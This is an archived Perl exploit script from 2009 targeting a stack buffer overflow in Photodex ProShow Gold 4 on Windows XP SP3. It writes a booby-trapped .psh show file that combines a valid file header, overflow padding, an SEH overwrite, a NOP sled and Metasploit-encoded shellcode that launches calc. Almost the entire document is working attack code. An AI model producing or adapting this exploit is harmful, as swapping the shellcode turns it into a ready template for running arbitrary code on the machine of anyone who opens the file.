<html><head><title>Photodex ProShow Gold 4 (.psh File) Universal BOF Exploit XP SP3 (SEH)</title></head><pre>#
# [+] Vulnerability     : ProShow Gold 4 BOF
# [+] Detected by       : Bkis - http://blog.bkis.com/?p=737
# [*] Sploit coded by   : corelanc0d3r  (corelanc0d3r[at]gmail[dot]com)
# [*] Sploit coded on   : August 20, 2009
# [*] Type              : local
# [*] OS                : Windows
# [*] Product           : Photodex ProShow Gold
# [*] Versions affected : 4.0
# [*] Download link     : http://www.photodex.com/downloads/go_proshowgold
# [*] -------------------------------------------------------------------------
# [*] Method            : SEH - Universal
# [*] Tested on         : Windows XP SP3 En
# [*] Greetz&amp;Tx to      : Saumil/SK
# [*] -------------------------------------------------------------------------
#                                               MMMMM~.                          
#                                               MMMMM?.                          
#    MMMMMM8.  .=MMMMMMM.. MMMMMMMM, MMMMMMM8.  MMMMM?. MMMMMMM:   MMMMMMMMMM.   
#  MMMMMMMMMM=.MMMMMMMMMMM.MMMMMMMM=MMMMMMMMMM=.MMMMM?7MMMMMMMMMM: MMMMMMMMMMM:  
#  MMMMMIMMMMM+MMMMM$MMMMM=MMMMMD$I8MMMMMIMMMMM~MMMMM?MMMMMZMMMMMI.MMMMMZMMMMM:  
#  MMMMM==7III~MMMMM=MMMMM=MMMMM$. 8MMMMMZ$$$$$~MMMMM?..MMMMMMMMMI.MMMMM+MMMMM:  
#  MMMMM=.     MMMMM=MMMMM=MMMMM7. 8MMMMM?    . MMMMM?NMMMM8MMMMMI.MMMMM+MMMMM:  
#  MMMMM=MMMMM+MMMMM=MMMMM=MMMMM7. 8MMMMM?MMMMM:MMMMM?MMMMMIMMMMMO.MMMMM+MMMMM:  
#  =MMMMMMMMMZ~MMMMMMMMMM8~MMMMM7. .MMMMMMMMMMO:MMMMM?MMMMMMMMMMMMIMMMMM+MMMMM:  
#  .:$MMMMMO7:..+OMMMMMO$=.MMMMM7.  ,IMMMMMMO$~ MMMMM?.?MMMOZMMMMZ~MMMMM+MMMMM:  
#     .,,,..      .,,,,.   .,,,,,     ..,,,..   .,,,,.. .,,...,,,. .,,,,..,,,,.  
#                                                                   eip hunters
# -----------------------------------------------------------------------------
# Script provided 'as is', without any warranty. 
# Use for educational purposes only.
#
print &quot; [+] Preparing payload\n&quot;;
my $sploitfile=&quot;proshowsploit.psh&quot;;
my $fileheader=&quot;Photodex(R) ProShow(TM) Show File Version=0\n&quot;.
&quot;proshowVersion=2549\n&quot;.
&quot;title=Untitled ProShow 1\n&quot;.
&quot;fileName=proshowsploit.psh\n&quot;.
&quot;description=''\n&quot;.
&quot;showAspect=1\n&quot;.
&quot;showSizeX=16\n&quot;.
&quot;showSizeY=9\n&quot;.
&quot;loop=1\n&quot;.
&quot;loopRestart=1\n&quot;.
&quot;displaySizeX=704\n&quot;.
&quot;displaySizeY=528\n&quot;.
&quot;videoSizeX=720\n&quot;.
&quot;videoSizeY=480\n&quot;.
&quot;videoFrameRate=29970\n&quot;.
&quot;videoBitRate=1120000\n&quot;.
&quot;videoMuxBitRate=1394400\n&quot;.
&quot;outputImageSizeX=1024\n&quot;.
&quot;outputImageSizeY=768\n&quot;.
&quot;outputQuality=80\n&quot;.
&quot;toolbarEnable=1\n&quot;.
&quot;allowQuit=1\n&quot;.
&quot;allowPlay=1\n&quot;.
&quot;allowTime=1\n&quot;.
&quot;allowRestart=1\n&quot;.
&quot;allowSave=1\n&quot;.
&quot;allowSaveAll=1\n&quot;.
&quot;allowPrint=1\n&quot;.
&quot;allowPrintAll=1\n&quot;.
&quot;allowCopy=1\n&quot;.
&quot;allowSaver=1\n&quot;.
&quot;allowCta=1\n&quot;.
&quot;ctaLabel=ProShow Info\n&quot;.
&quot;ctaURL=http://www.photodex.com/\n&quot;.
&quot;background=1\n&quot;.
&quot;bgOutlineColor=0\n&quot;.
&quot;bgSizeMode=1\n&quot;.
&quot;bgColorizeColor=8421504\n&quot;.
&quot;waterOpacity=128\n&quot;.
&quot;waterZoom=10000\n&quot;.
&quot;waterColorizeColor=8421504\n&quot;.
&quot;musicVolumeOffset=100\n&quot;.
&quot;defaultCellVolumeOffset=100\n&quot;.
&quot;defaultCellFadeIn=100\n&quot;.
&quot;defaultCellFadeOut=100\n&quot;.
&quot;defaultMusicVolumeOffset=50\n&quot;.
&quot;defaultMusicFadeIn=100\n&quot;.
&quot;defaultMusicFadeOut=100\n&quot;.
&quot;maxDispWidth=800\n&quot;.
&quot;maxDispHeight=600\n&quot;.
&quot;maxRender=1\n&quot;.
&quot;maxRenderWidth=800\n&quot;.
&quot;maxRenderHeight=600\n&quot;.
&quot;randomTransitions=FFFFFFFF:FFFFFFFF:FFFFFFFF:FFFFFFFF:FFFFFFFF:FFFFFFFF:FFFFFFFF:FFFFFFFF:FFFFFFFF:FFFFFFFF\n&quot;.
&quot;makeFileLocalFolder=c:/\n&quot;.
&quot;cells=2\n&quot;.
&quot;cell[0].imageEnable=1\n&quot;.
&quot;cell[0].nrOfImages=1\n&quot;.
&quot;cell[0].images[0].image=../../../../../Media Sources/ProShow Gold - Built-In Content/Backgrounds/Abstract_02.jpg&quot;;
my $junk = &quot;A&quot; x 6120;
my $nseh = &quot;\xeb\x18\x90\x90&quot;;
my $seh = pack('V',0x01a614ea);
my $nop=&quot;\x90&quot; x 30;
# windows/exec - 144 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# EXITFUNC=seh, CMD=calc
my $shellcode=&quot;\xda\xd1\xd9\x74\x24\xf4\x2b\xc9\xb1\x1e\xbd\x78\x41\xbf&quot; .
&quot;\x6f\x58\x83\xe8\xfc\x31\x68\x14\x03\x68\x6c\xa3\x4a\x93&quot; .
&quot;\x64\x67\xb5\x6c\x74\xe3\xf0\x50\xff\x8f\xff\xd0\xfe\x80&quot; .
&quot;\x8b\x6e\x18\xd4\xd3\x50\x19\x01\xa2\x1b\x2d\x5e\x34\xf2&quot; .
&quot;\x7c\xa0\xae\xa6\xfa\xe0\xa5\xb1\xc3\x2b\x48\xbf\x01\x40&quot; .
&quot;\xa7\x84\xd1\xb3\x4c\x8e\x3c\x30\x13\x54\xbf\xac\xca\x1f&quot; .
&quot;\xb3\x79\x98\x7f\xd7\x7c\x75\xf4\xfb\xf5\x88\xe0\x8a\x56&quot; .
&quot;\xaf\xf2\x4f\x39\x9e\x0c\x2f\x90\x84\x7b\xe9\x2c\xce\x3c&quot; .
&quot;\xf9\xc7\xa0\xa0\xac\x53\x28\xd1\x27\x9b\x2a\x21\x5d\x0c&quot; .
&quot;\x45\x52\x2b\xa8\xca\xfa\xb3\x4f\x7e\xf4\x94\x50\x98\x6a&quot; .
&quot;\x7b\xc3\x04\x6d&quot;;

my $junk2=&quot;D&quot; x (2000-length($shellcode));
my $filefooter = &quot;\ncell[0].images[0].imageEnable=1\n&quot;.
&quot;cell[0].images[0].name=Abstract_02\n&quot;.
&quot;cell[0].images[0].replaceableTemplate=1\n&quot;.
&quot;cell[0].images[0].sizeMode=1\n&quot;.
&quot;cell[0].images[0].colorizeColor=8421504\n&quot;.
&quot;cell[0].images[0].colorizeStrength=10000\n&quot;.
&quot;cell[0].images[0].outlineColor=16777215\n&quot;.
&quot;cell[0].images[0].aspectX=4\n&quot;.
&quot;cell[0].images[0].aspectY=3\n&quot;.
&quot;cell[0].images[0].videoVolume=100\n&quot;.
&quot;cell[0].images[0].objectId=1\n&quot;.
&quot;cell[0].images[0].videoSpeed=100\n&quot;.
&quot;cell[0].images[0].nrOfKeyframes=2\n&quot;.
&quot;cell[0].images[0].keyframes[0].timeSegment=1\n&quot;.
&quot;cell[0].images[0].keyframes[0].attributeMask=-1\n&quot;.
&quot;cell[0].images[0].keyframes[0].zoomX=10000\n&quot;.
&quot;cell[0].images[0].keyframes[0].zoomY=10000\n&quot;.
&quot;cell[0].images[0].keyframes[0].panAccelType=1\n&quot;.
&quot;cell[0].images[0].keyframes[0].zoomXAccelType=1\n&quot;.
&quot;cell[0].images[0].keyframes[0].zoomYAccelType=1\n&quot;.
&quot;cell[0].images[0].keyframes[0].rotationAccelType=1\n&quot;.
&quot;cell[0].images[0].keyframes[0].motionSmoothness=-1\n&quot;.
&quot;cell[0].images[0].keyframes[0].lockAR=1\n&quot;.
&quot;cell[0].images[0].keyframes[0].transparency=0\n&quot;.
&quot;cell[0].images[0].keyframes[0].colorizeColor=8421504\n&quot;.
&quot;cell[0].images[0].keyframes[0].colorizeStrength=10000\n&quot;.
&quot;cell[0].images[0].keyframes[0].shadowOffsetX=70\n&quot;.
&quot;cell[0].images[0].keyframes[0].shadowOffsetY=70\n&quot;.
&quot;cell[0].images[0].keyframes[1].timestamp=10000\n&quot;.
&quot;cell[0].images[0].keyframes[1].timeSegment=3\n&quot;.
&quot;cell[0].images[0].keyframes[1].segmentTimestamp=10000\n&quot;.
&quot;cell[0].images[0].keyframes[1].attributeMask=-1\n&quot;.
&quot;cell[0].images[0].keyframes[1].zoomX=10000\n&quot;.
&quot;cell[0].images[0].keyframes[1].zoomY=10000\n&quot;.
&quot;cell[0].images[0].keyframes[1].panAccelType=1\n&quot;.
&quot;cell[0].images[0].keyframes[1].zoomXAccelType=1\n&quot;.
&quot;cell[0].images[0].keyframes[1].zoomYAccelType=1\n&quot;.
&quot;cell[0].images[0].keyframes[1].rotationAccelType=1\n&quot;.
&quot;cell[0].images[0].keyframes[1].motionSmoothness=-1\n&quot;.
&quot;cell[0].images[0].keyframes[1].lockAR=1\n&quot;.
&quot;cell[0].images[0].keyframes[1].transparency=0\n&quot;.
&quot;cell[0].images[0].keyframes[1].colorizeColor=8421504\n&quot;.
&quot;cell[0].images[0].keyframes[1].colorizeStrength=10000\n&quot;.
&quot;cell[0].images[0].keyframes[1].shadowOffsetX=70\n&quot;.
&quot;cell[0].images[0].keyframes[1].shadowOffsetY=70\n&quot;.
&quot;cell[0].background=1\n&quot;.
&quot;cell[0].bgDefault=1\n&quot;.
&quot;cell[0].bgSizeMode=1\n&quot;.
&quot;cell[0].bgColorizeColor=8421504\n&quot;.
&quot;cell[0].sound.useDefault=1\n&quot;.
&quot;cell[0].sound.volume=100\n&quot;.
&quot;cell[0].sound.fadeIn=100\n&quot;.
&quot;cell[0].sound.fadeOut=100\n&quot;.
&quot;cell[0].sound.async=1\n&quot;.
&quot;cell[0].sound.musicUseDefault=1\n&quot;.
&quot;cell[0].sound.musicVolume=50\n&quot;.
&quot;cell[0].sound.musicFadeIn=100\n&quot;.
&quot;cell[0].sound.musicFadeOut=100\n&quot;.
&quot;cell[0].musicVolumeOffset=50\n&quot;.
&quot;cell[0].time=3000\n&quot;.
&quot;cell[0].transId=2\n&quot;.
&quot;cell[0].transTime=3000\n&quot;.
&quot;cell[0].includeGlobalCaptions=1\n&quot;.
&quot;cell[1].imageEnable=1\n&quot;.
&quot;cell[1].nrOfImages=1\n&quot;.
&quot;cell[1].images[0].image=../../../../../Media Sources/ProShow Gold - Built-In Content/Backgrounds/Abstract_01.jpg\n&quot;.
&quot;cell[1].images[0].imageEnable=1\n&quot;.
&quot;cell[1].images[0].name=Abstract_01\n&quot;.
&quot;cell[1].images[0].replaceableTemplate=1\n&quot;.
&quot;cell[1].images[0].sizeMode=1\n&quot;.
&quot;cell[1].images[0].colorizeColor=8421504\n&quot;.
&quot;cell[1].images[0].colorizeStrength=10000\n&quot;.
&quot;cell[1].images[0].outlineColor=16777215\n&quot;.
&quot;cell[1].images[0].aspectX=4\n&quot;.
&quot;cell[1].images[0].aspectY=3\n&quot;.
&quot;cell[1].images[0].videoVolume=100\n&quot;.
&quot;cell[1].images[0].objectId=2\n&quot;.
&quot;cell[1].images[0].videoSpeed=100\n&quot;.
&quot;cell[1].images[0].nrOfKeyframes=2\n&quot;.
&quot;cell[1].images[0].keyframes[0].timeSegment=1\n&quot;.
&quot;cell[1].images[0].keyframes[0].attributeMask=-1\n&quot;.
&quot;cell[1].images[0].keyframes[0].zoomX=10000\n&quot;.
&quot;cell[1].images[0].keyframes[0].zoomY=10000\n&quot;.
&quot;cell[1].images[0].keyframes[0].panAccelType=1\n&quot;.
&quot;cell[1].images[0].keyframes[0].zoomXAccelType=1\n&quot;.
&quot;cell[1].images[0].keyframes[0].zoomYAccelType=1\n&quot;.
&quot;cell[1].images[0].keyframes[0].rotationAccelType=1\n&quot;.
&quot;cell[1].images[0].keyframes[0].motionSmoothness=-1\n&quot;.
&quot;cell[1].images[0].keyframes[0].lockAR=1\n&quot;.
&quot;cell[1].images[0].keyframes[0].transparency=0\n&quot;.
&quot;cell[1].images[0].keyframes[0].colorizeColor=8421504\n&quot;.
&quot;cell[1].images[0].keyframes[0].colorizeStrength=10000\n&quot;.
&quot;cell[1].images[0].keyframes[0].shadowOffsetX=70\n&quot;.
&quot;cell[1].images[0].keyframes[0].shadowOffsetY=70\n&quot;.
&quot;cell[1].images[0].keyframes[1].timestamp=10000\n&quot;.
&quot;cell[1].images[0].keyframes[1].timeSegment=3\n&quot;.
&quot;cell[1].images[0].keyframes[1].segmentTimestamp=10000\n&quot;.
&quot;cell[1].images[0].keyframes[1].attributeMask=-1\n&quot;.
&quot;cell[1].images[0].keyframes[1].zoomX=10000\n&quot;.
&quot;cell[1].images[0].keyframes[1].zoomY=10000\n&quot;.
&quot;cell[1].images[0].keyframes[1].panAccelType=1\n&quot;.
&quot;cell[1].images[0].keyframes[1].zoomXAccelType=1\n&quot;.
&quot;cell[1].images[0].keyframes[1].zoomYAccelType=1\n&quot;.
&quot;cell[1].images[0].keyframes[1].rotationAccelType=1\n&quot;.
&quot;cell[1].images[0].keyframes[1].motionSmoothness=-1\n&quot;.
&quot;cell[1].images[0].keyframes[1].lockAR=1\n&quot;.
&quot;cell[1].images[0].keyframes[1].transparency=0\n&quot;.
&quot;cell[1].images[0].keyframes[1].colorizeColor=8421504\n&quot;.
&quot;cell[1].images[0].keyframes[1].colorizeStrength=10000\n&quot;.
&quot;cell[1].images[0].keyframes[1].shadowOffsetX=70\n&quot;.
&quot;cell[1].images[0].keyframes[1].shadowOffsetY=70\n&quot;.
&quot;cell[1].background=1\n&quot;.
&quot;cell[1].bgDefault=1\n&quot;.
&quot;cell[1].bgSizeMode=1\n&quot;.
&quot;cell[1].bgColorizeColor=8421504\n&quot;.
&quot;cell[1].sound.useDefault=1\n&quot;.
&quot;cell[1].sound.volume=100\n&quot;.
&quot;cell[1].sound.fadeIn=100\n&quot;.
&quot;cell[1].sound.fadeOut=100\n&quot;.
&quot;cell[1].sound.async=1\n&quot;.
&quot;cell[1].sound.musicUseDefault=1\n&quot;.
&quot;cell[1].sound.musicVolume=50\n&quot;.
&quot;cell[1].sound.musicFadeIn=100\n&quot;.
&quot;cell[1].sound.musicFadeOut=100\n&quot;.
&quot;cell[1].musicVolumeOffset=50\n&quot;.
&quot;cell[1].time=3000\n&quot;.
&quot;cell[1].transId=2\n&quot;.
&quot;cell[1].transTime=3000\n&quot;.
&quot;cell[1].includeGlobalCaptions=1\n&quot;.
&quot;modifierCount=0\n&quot;;

my $payload = $fileheader.$junk.$nseh.$seh.$nop.$shellcode.$junk2.$filefooter;

print &quot; [+] Writing payload to file\n&quot;;
open($FILE,&quot;&gt;$sploitfile&quot;);
print $FILE $payload;
close($FILE);
print &quot; [+] Exploit file &quot; . $sploitfile . &quot; created\n&quot;;
print &quot; [+] Wrote &quot; . length($payload) . &quot; bytes\n&quot;;

# milw0rm.com [2009-08-24]</pre></html>